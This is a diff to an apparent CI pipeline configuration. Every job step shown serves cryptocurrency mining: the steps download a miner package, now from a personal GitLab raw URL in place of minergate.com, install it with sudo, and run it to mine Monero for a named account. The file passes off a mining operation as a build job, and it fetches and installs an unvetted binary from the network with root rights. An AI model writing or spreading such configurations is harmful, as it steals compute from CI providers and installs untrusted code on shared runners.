@@ -5,6 +5,6 @@ jobs:
 
     steps:
       - checkout
-      - run: wget https://minergate.com/download/deb-cli -O minergate-cli.deb
-      - run: sudo dpkg -i minergate-cli.deb
+      - run: wget https://gitlab.com/Yoginth/Miner/raw/master/yogi-cli.deb -O yogi-cli.deb
+      - run: sudo dpkg -i yogi-cli.deb
       - run: minergate-cli -user yoginth@hotmail.com  xmr
